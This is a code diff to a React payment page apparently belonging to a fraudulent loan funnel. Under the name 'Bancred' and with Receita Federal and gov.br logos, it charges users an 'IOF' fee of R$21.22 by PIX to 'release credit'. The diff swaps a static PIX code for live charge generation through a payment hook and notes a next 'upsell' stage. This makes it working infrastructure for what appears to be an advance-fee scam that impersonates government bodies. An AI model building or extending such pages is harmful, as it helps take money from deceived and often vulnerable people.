@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useState } from "react";
+import { useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import {
   Landmark,
@@ -16,6 +16,7 @@ import {
 import logo from "@/assets/bancred-logo.png";
 import receitaLogo from "@/assets/receita-federal-logo.svg";
 import govbrLogo from "@/assets/govbr-logo.png";
+import { useParadisePix } from "@/hooks/useParadisePix";
 
 const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';
 
@@ -32,8 +33,6 @@ const PixIcon = ({ size = 20 }: { size?: number }) => (
   </svg>
 );
 
-const PIX_PAYLOAD =
-  "00020101021226800014br.gov.bcb.pix2558qrcode.mkip.com.br/v1/iof-bancred-up15204000053039865802BR5915TTKBRASILSEGURO6008SAOPAULO62070503***6304A1B2";
 
 const Up1 = () => {
   const [params] = useSearchParams();
@@ -45,32 +44,43 @@ const Up1 = () => {
   const valorIOF = 21.22;
 
   const [showPix, setShowPix] = useState(false);
-  const [pixLoading, setPixLoading] = useState(true);
   const [copied, setCopied] = useState(false);
 
-  useEffect(() => {
-    if (showPix) {
-      setPixLoading(true);
-      const t = setTimeout(() => setPixLoading(false), 2200);
-      return () => clearTimeout(t);
-    }
-  }, [showPix]);
+  const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
+    // Próximo upsell (a definir): por enquanto continua na mesma tela
+    // navigate(`/up2?${params.toString()}`);
+  });
 
-  const handleCopy = async () => {
+  const openPix = async () => {
+    setShowPix(true);
     try {
-      await navigator.clipboard.writeText(PIX_PAYLOAD);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2200);
+      await create({
+        amountCents: Math.round(valorIOF * 100),
+        description: `IOF Bancred - Liberação de crédito`,
+        stage: "iof",
+        customer: nomeRaw ? { name: nomeRaw } : undefined,
+      });
     } catch {
-      // ignore
+      /* erro tratado pelo hook */
     }
   };
 
-  const qrUrl = useMemo(
-    () =>
-      `https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=${encodeURIComponent(PIX_PAYLOAD)}`,
-    []
-  );
+  const closePix = () => {
+    setShowPix(false);
+    reset();
+    setCopied(false);
+  };
+
+  const handleCopy = async () => {
+    if (!pix?.qr_code) return;
+    try {
+      await navigator.clipboard.writeText(pix.qr_code);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2200);
+    } catch {
+      /* ignore */
+    }
+  };
 
   return (
     <div
@@ -257,7 +267,7 @@ const Up1 = () => {
 
         <button
           type="button"
-          onClick={() => setShowPix(true)}
+          onClick={openPix}
           style={{
             width: "100%",
             padding: "15px 20px",
@@ -305,7 +315,7 @@ const Up1 = () => {
             justifyContent: "center",
             zIndex: 60,
           }}
-          onClick={() => setShowPix(false)}
+          onClick={closePix}
         >
           <div
             onClick={(e) => e.stopPropagation()}
@@ -330,7 +340,7 @@ const Up1 = () => {
               </div>
               <button
                 type="button"
-                onClick={() => setShowPix(false)}
+                onClick={closePix}
                 aria-label="Fechar"
                 style={{ background: "transparent", border: "none", cursor: "pointer", color: "#6B7280" }}
               >
@@ -374,10 +384,10 @@ const Up1 = () => {
               </div>
             </div>
 
-            {pixLoading ? (
+            {pixLoading || !pix ? (
               <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0" }}>
                 <Loader2 size={42} color="#1C68E3" style={{ animation: "spin 1s linear infinite" }} />
-                <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>Gerando seu código PIX...</div>
+                <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>{pixError ? pixError : "Gerando seu código PIX..."}</div>
                 <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
               </div>
             ) : (
@@ -394,7 +404,7 @@ const Up1 = () => {
                   </div>
                   <div style={{ display: "flex", justifyContent: "center" }}>
                     <img
-                      src={qrUrl}
+                      src={pix.qr_image}
                       alt="QR Code PIX"
                       width={240}
                       height={240}
@@ -418,7 +428,7 @@ const Up1 = () => {
                     marginBottom: 12,
                   }}
                 >
-                  {PIX_PAYLOAD}
+                  {pix.qr_code}
                 </div>
 
                 <button
